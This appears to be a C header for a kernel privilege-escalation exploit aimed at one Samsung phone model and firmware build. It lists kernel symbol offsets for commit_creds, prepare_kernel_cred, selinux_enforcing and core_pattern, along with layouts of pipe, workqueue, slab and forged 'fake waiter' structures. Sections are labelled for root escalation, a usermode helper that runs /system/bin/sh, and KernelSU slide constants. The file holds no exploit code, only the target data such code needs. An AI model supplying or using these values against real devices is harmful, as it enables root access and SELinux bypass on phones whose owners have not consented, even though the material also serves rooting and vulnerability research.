// ========== DEVICE INFO ==========
#define TARGET_MODEL "SM-M145F"
#define TARGET_FIRMWARE "M145FXXSCDZE1"
#define TARGET_KERNEL_VERSION "5.15.180"

// ========== KERNEL MEMORY LAYOUT ==========
#define KIMAGE_TEXT_BASE       0xffffffc008000000
#define P0_PAGE_OFFSET         0xffffffc000000000
#define P0_PHYS_OFFSET         0x0000000000000000
#define P0_KERNEL_PHYS_LOAD    0x0000000001000000
#define DIRECT_MAP_BASE        0xffffffc000000000
#define DIRECT_MAP_END         0xffffffc040000000
#define VMEMMAP_START          0xffffffc040000000
#define STRUCT_PAGE_SIZE       64
#define PAGE_SHIFT             12

// ========== OFFSETS ==========
#define OFFSET_commit_creds 0x18b654
#define OFFSET_prepare_kernel_cred 0x18a3f0
#define OFFSET_call_usermodehelper_exec_work 0x16ec08
#define OFFSET_init_task 0xacc5e80
#define OFFSET_selinux_enforcing 0xab37404
#define OFFSET_kernel_read 0x557084
#define OFFSET_do_faccessat 0x550278
#define OFFSET_core_pattern 0xac56140

// ========== CONFIGFS FUNCTIONS ==========
#define CONFIGFS_READ_ITER      0x67f0cc
#define CONFIGFS_BIN_WRITE_ITER 0x67fbf0

// ========== PIPE/STRUCT OFFSETS ==========
#define ANON_PIPE_BUF_OPS       0x9fe61b0
#define KMALLOC_CACHES          0xa1d5250
#define SYSTEM_UNBOUND_WQ       0xab807d8

// ========== ASHMEM FUNCTIONS (Not in kernel) ==========
#define ASHMEM_IOCTL            0x00000000
#define ASHMEM_COMPAT_IOCTL     0x00000000
#define ASHMEM_MMAP             0x00000000
#define ASHMEM_OPEN             0x00000000
#define ASHMEM_RELEASE          0x00000000
#define ASHMEM_MISC_FOPS        0x00000000
#define ASHMEM_FOPS             0x00000000
#define ASHMEM_SHOW_FDINFO      0x00000000

// ========== SYMBOLS FOR ROOT ESCALATION ==========
#define SELINUX_ENFORCING       OFFSET_selinux_enforcing
#define CALL_USERMODEHELPER_EXEC_WORK OFFSET_call_usermodehelper_exec_work
#define INIT_TASK               OFFSET_init_task

// ========== FILE OPERATIONS OFFSETS ==========
#define FOPS_OWNER_OFF          0x00
#define FOPS_LLSEEK_OFF         0x08
#define FOPS_READ_OFF           0x10
#define FOPS_WRITE_OFF          0x18
#define FOPS_READ_ITER_OFF      0x20
#define FOPS_WRITE_ITER_OFF     0x28
#define FOPS_IOCTL_OFF          0x30
#define FOPS_COMPAT_IOCTL_OFF   0x38
#define FOPS_MMAP_OFF           0x40
#define FOPS_OPEN_OFF           0x48
#define FOPS_RELEASE_OFF        0x50
#define FOPS_SHOW_FDINFO_OFF    0x58
#define FOPS_SPLICE_READ_OFF    0x60
#define NOOP_LLSEEK             0x00000000
#define COPY_SPLICE_READ        0x00000000

// ========== PIPE CONSTANTS ==========
#define PIPE_BUFFER_SLOTS       16
#define PIPE_BUF_FLAG_CAN_MERGE 0x01

// ========== WORKQUEUE OFFSETS ==========
#define WORK_ENTRY_OFF          0x00
#define WORK_DATA_OFF           0x08
#define WORK_FUNC_OFF           0x08
#define WQ_DFL_PWQ_OFF          0x10
#define PWQ_POOL_OFF            0x08
#define PWQ_WQ_OFF              0x10
#define PWQ_WORK_COLOR_OFF      0x18
#define PWQ_REFCNT_OFF          0x1c
#define PWQ_NR_ACTIVE_OFF       0x20
#define PWQ_MAX_ACTIVE_OFF      0x24
#define PWQ_NR_IN_FLIGHT_OFF    0x28
#define POOL_WORKLIST_OFF       0x00
#define POOL_NR_IDLE_OFF        0x08

// ========== SLAB/STRUCT OFFSETS ==========
#define KMALLOC_BUCKETS         8
#define KMALLOC_CGROUP_TYPE     0
#define KMALLOC_PIPE_INDEX      0
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF   0x10
#define STRUCT_PAGE_TYPE_OFF    0x18

// ========== FAKE WAITER OFFSETS ==========
#define FAKE_WAITER_TREE_PRIO_OFF     0x00
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x08
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x10
#define FAKE_WAITER_PI_TREE_PRIO_OFF  0x20
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x28
#define FAKE_WAITER_TASK_OFF          0x30
#define FAKE_WAITER_LOCK_OFF          0x38
#define FAKE_WAITER_WAKE_STATE_OFF    0x40
#define FAKE_WAITER_WW_CTX_OFF        0x48

// ========== ROOT UMH OFFSETS ==========
#define ROOT_UMH_WORK_OFF       0x00
#define ROOT_UMH_DATA_OFF       0x100
#define ROOT_UMH_PATH           "/system/bin/sh"

// ========== KERNELSU SLIDE CONSTANTS ==========
#define SLIDE_INIT_TASK_IMAGE                     0xacc5e80
#define SLIDE_WAITER_TASK                         0x0
#define SLIDE_TRACEFS_EVENT_ID                    108
#define SLIDE_PSELECT_NFDS                        64
#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE          0
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE            0
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE 0
#define SLIDE_SYSCTL_BOOTID_IMAGE                 0

// ========== BUILD VARIANT ==========
#define BUILD_VARIANT_LABEL     "user"
